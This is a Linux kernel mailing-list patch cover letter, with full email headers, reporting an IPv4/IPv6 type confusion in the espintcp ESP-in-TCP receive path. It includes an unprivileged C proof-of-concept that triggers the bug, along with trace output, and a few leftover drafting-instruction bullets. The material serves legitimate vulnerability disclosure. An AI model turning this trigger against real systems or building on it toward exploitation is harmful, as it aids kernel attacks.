Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.170
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794844359;
	b=J0MbYxAEQPbzJbqgS4xM2W7zT7OLypGmN6CeyXBGH8kVhNeiYFfjyLCng1tp6LGwabiJ
	 DM8i8bpyj0cPRUeD+gn2oVtI5Y866Xfj4bgm4P2uExy5RuI89uTLLCv9TOPZ+qyhaTiH6
	 vBqaKePPbNNHev9h6L88QksO/VoMNnKEYbeZn/0UKVpd0BRszrVEOgCsFmv+yUcX4zOTh
	 sbHKOSywTApI56YTzQYrl78AcONNLSuOS3d88Pj1HkSAN2pQoUHndwFgASZtgT5qvj++2
	 8a3cDaUzx4kw8vRD0t9yD3XuBRw67MpPEjUtXE2apzI3N2iOFn9MyABMzmgRtZELlXA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794844359;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
	b=JlYI0cvZH52cvf471c+X1kOet0b5F/rQc0JdBUZI/aqlj1zvOmIHXs5HWhBX4JQkSkg4
	 TD4xSuUJauZk4vbej9sc63RvLLT7Lortw9WSWeDgn7Fjve5z+JaQI/onBOEX9dURdOISe
	 xjQt/deUEsqXaS9Br6/dA/KPvPs3PHvUrElA3K5ETVKv9uiV+mg5oKj3FOanyLV7tbceR
	 rICKLwEEsoThvMlPsKrgJZm1uMIVwSEBm3f1/tMw+OM+qPuEyZoZFDywl/4aF79bwlM3Z
	 yq10zvkbCyOOmxD90ZLKWu92j25o+nNtjNXU/o8PHl6YTjnOU27cbRf80GVH/9sGPrA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ScN1kPKr;
	arc=none smtp.remote-ip=209.85.214.170
Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 87D75606A32F
	for <netdev@vger.kernel.org>; Mon, 16 Nov 2026 15:52:38 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 87D75606A32F
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ScN1kPKr
Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2ed1f1a7695so12252825ad.2
        for <netdev@vger.kernel.org>; Mon, 16 Nov 2026 07:52:38 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1794844358; x=1795449158; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
        b=ScN1kPKrMuNIcrriX0VYmipS6tYU9fH3XOn9hWmH5oHsg9wh2VGluvUTkWC2MFf493
         QEdFGlmTHGsSuBKirVuBntcbOISSvI3IEIhQ7s5HhG/OSR5sd3lUcvg2V+ZBZDiwUGDX
         f5qIYs6QmUcM24FzRQAAVJvm7LfGjKIwMjvfnJzIyiD7unVkL6G7MU/ogQ4bUggS9Tvh
         Y9LOCzxfo6MlpWQsImDObqPZ3e+HXxPpe1xJJlvmab1uIUKlCif5pn/JIyCZqdrDOhVT
         SD3x2nEv988+vEVxwyPaBjXq5i0UN+Nd0D54zBEP6lNrr4ertCfaud9MxHhiGOTsufsE
         uE+Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794844358; x=1795449158;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
        b=fx5CCC6GXTG65RM/El2rH1t5T4C/hWbMdG2Nr/+ZrTFf7xb8Z3xcNcEmoknAc2yR54
         C+MeQGcanTfn/U+Gqx9tlhgx3t0mL+MRcG9Bkkzzg/pa4UC5EeY99dXu/q8awogi0cRD
         01MlqqnJMQx9OcuHa0GThl+9LoVCvXzppHmC7k4t2+/tsQGvYttn3+g5Bf65k8oDfb3R
         sx+kjeXdBxfDmOtoOxGglvd/3loTY/Va1ke5W8DxerX7clMH9rRlCtqOCtEM+uBpbZGe
         eyzY1Zhu3ZUp+nAFVSYsrZIwbaa4PDcZaj24Fz0BKgazIBEG1k7NkXzFLywnDULvJluA
         XSvg==
X-Gm-Message-State: APuU4Z+DJ/g7pF6Gcbo8aNXpZYdehKUg4bpgSEqSqUj8zcGxlDlKRp+w
	TPVedgYODxfgOM9+XWhzHt4UHMs/4fqrMtxfs0VX3N9Rgd2hwutpgFqKmvCgWvQ/aw8CmFJ5CYz
	CHnOL7kFo
X-Gm-Gg: AZFdTZcb8TC1pZBP3UfzOOLTuAT66ocaGmkancc48GNAWR2i2Cp9BoXsetizxQYNZu/
	tjZUo9SHCo7mCOXNsZQbvXiAthb3LhPtOQ4OtmyJdTwYnuO4Q1IzqpG7macHe43LBI3Ay/iuVfS
	dTfPLJvXoSrZvxNsaKGJAYjbaEDACnlrW9UzYg5KBNXGTM965SEX11D2FcqqK5/vzFf9D6NY/DS
	Nu3K4+q1Oi9Ysi1w/I9PzlJqliI90tnCCokE8TOt/4DJNHcjAFn9EGXIMjwULk6nKdyZuAlIex/
	G/Cz+OGLQpZlkT+LBnqkWU+sbHyW/tXjZ/CGXSrCqa8Pi8PmELiUBj3tzRR/sASZJGNjOZKyPC9
	dbS04B6n+RPmEjGjMl2X6xrFrmeEkvNFXIU8twVLpaI3t7Db5kKjRS7ItP3DNbPs1xVL4Zi0q+T
	oxbarO5K4Qne/6wPd4FC79bg6AjUwmCdjYQimCuKStrFVmY2iou31yuEVENGXXLu/olyOVxKOSJ
	RcVFRHg7ir0kX/ZH4+UPoXulCkyn93XLq4TtkjySNgZEe3f5L8QWN6K445bM4EhdyvFYKyFPUbi
	xX96p8Vx3Zs+26W9zPfBdopCtWueZXij0TTF8iatUjOcce8mrAZC2xkveyA3bDZBybjprAhxA54
	Ho/NyfJY9/NcButx/LCyc
X-Received: by 2002:a17:903:9cc:b0:2ed:d1ff:fa91 with SMTP id d9443c01a7336-2ee0d666821mr106261195ad.10.1794844357525;
        Mon, 16 Nov 2026 07:52:37 -0800 (PST)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2efd7a36504sm1330985ad.30.2026.11.16.07.52.33
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 16 Nov 2026 07:52:36 -0800 (PST)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	ipsec@lists.linux.dev
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	sd@queasysnail.net,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] xfrm: espintcp: fix IPv4/IPv6 receive path confusion
Date: Mon, 16 Nov 2026 15:52:28 +0000
Message-ID: <20261116155229.318582-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/xfrm/espintcp.c. An IPv6 dual-stack socket can accept
an IPv4 connection as a v4-mapped peer. The accepted socket remains AF_INET6,
but the received skb is IPv4. ESP-in-TCP selected the XFRM receive path from
the socket family and passed the IPv4 skb to xfrm6_rcv_encap(), where IPv4
header bytes were interpreted as an IPv6 header.

This patch selects the receive path from skb->protocol, matching the packet
family and preventing the type-confused IPv6 processing.

An LLM was used to help create this patch.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/5016 (5016)

Bug details:

The vulnerable path is reachable by an unprivileged user using an AF_INET6
listener with IPV6_V6ONLY disabled, an IPv4 connection, and TCP_ULP=espintcp.
The historical supplied QEMU run observed xfrm6_rcv_encap() on the IPv4-backed
skb and an XfrmInNoStates increment; it did not produce a crash. The selected
origin/main baseline still contains the family-based dispatch. The fix is a
one-line protocol-based dispatch change.

Reproducer details:

- Use the static-build and unprivileged user/network-namespace commands in the
  reproducer instructions.
- Explain why a custom socket PoC is used instead of packetdrill.
- Include the observed normal output and tracing evidence, and explain why no
  crash-log exists.

Reproducer:

Build and run as an ordinary user in the guest:

    gcc -static -O2 -pthread poc.c -o poc
    unshare -Urn sh -c 'ip link set lo up; exec ./poc'

The custom C PoC is used because the trigger depends on AF_INET6 dual-stack
socket creation, v4-mapped accept state, and TCP_ULP=espintcp. Packetdrill
does not naturally express this socket API and ULP state combination.

Historical QEMU run output:

    accepted socket domain=10
    peer=::ffff:127.0.0.1 port=41512
    recv=0 errno=0

The historical tracing additionally showed:

    xfrm6_rcv_encap <-espintcp_rcv

and XfrmInNoStates increased by one (before=1004 after=1005 delta=1). The run
followed the no-state/error path without a KASAN report, oops, or crash-log,
so no crash-log is attached.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int port = 31338;
static volatile int ready;

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void *server_thread(void *arg)
{
	int ls = socket(AF_INET6, SOCK_STREAM, 0);
	int zero = 0, one = 1;
	struct sockaddr_in6 addr = {0};
	struct sockaddr_storage peer;
	struct sockaddr_in6 peer6 = {0};
	socklen_t peerlen = sizeof(peer);
	socklen_t peer6len = sizeof(peer6);
	char ulp[] = "espintcp";
	char addrbuf[INET6_ADDRSTRLEN];
	char rx[128];
	int as;
	int fam;
	socklen_t flen = sizeof(fam);
	ssize_t n;

	(void)arg;

	if (ls < 0)
		die("socket(AF_INET6)");
	if (setsockopt(ls, IPPROTO_IPV6, IPV6_V6ONLY, &zero, sizeof(zero)) < 0)
		die("setsockopt(IPV6_V6ONLY=0)");
	if (setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("setsockopt(SO_REUSEADDR)");

	addr.sin6_family = AF_INET6;
	addr.sin6_port = htons(port);
	addr.sin6_addr = in6addr_any;
	if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind");
	if (listen(ls, 1) < 0)
		die("listen");

	__atomic_store_n(&ready, 1, __ATOMIC_SEQ_CST);

	as = accept(ls, (struct sockaddr *)&peer, &peerlen);
	if (as < 0)
		die("accept");

	if (getsockopt(as, SOL_SOCKET, SO_DOMAIN, &fam, &flen) < 0)
		die("getsockopt(SO_DOMAIN)");
	fprintf(stderr, "accepted socket domain=%d\n", fam);

	if (getpeername(as, (struct sockaddr *)&peer6, &peer6len) < 0)
		die("getpeername");
	if (!inet_ntop(AF_INET6, &peer6.sin6_addr, addrbuf, sizeof(addrbuf)))
		die("inet_ntop");
	fprintf(stderr, "peer=%s port=%u\n", addrbuf, ntohs(peer6.sin6_port));

	if (setsockopt(as, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("setsockopt(TCP_ULP=espintcp)");

	n = recv(as, rx, sizeof(rx), 0);
	fprintf(stderr, "recv=%zd errno=%d\n", n, errno);

	close(as);
	close(ls);
	return NULL;
}

int main(void)
{
	pthread_t th;
	int cs;
	struct sockaddr_in a = {0};
	unsigned char msg[10] = {
		0x00, 0x0a,
		0x12, 0x34, 0x56, 0x78,
		0xaa, 0xbb, 0xcc, 0xdd,
	};

	if (pthread_create(&th, NULL, server_thread, NULL) != 0)
		die("pthread_create");

	while (!__atomic_load_n(&ready, __ATOMIC_SEQ_CST))
		sched_yield();

	cs = socket(AF_INET, SOCK_STREAM, 0);
	if (cs < 0)
		die("socket(AF_INET)");

	a.sin_family = AF_INET;
	a.sin_port = htons(port);
	if (inet_pton(AF_INET, "127.0.0.1", &a.sin_addr) != 1)
		die("inet_pton");
	if (connect(cs, (struct sockaddr *)&a, sizeof(a)) < 0)
		die("connect");

	if (send(cs, msg, sizeof(msg), 0) < 0)
		die("send");

	close(cs);
	pthread_join(th, NULL);
	return 0;
}

------END PoC--------

Best regards,
Zihan Xi

Zihan Xi (1):
  xfrm: espintcp: select receive path by skb protocol

 net/xfrm/espintcp.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

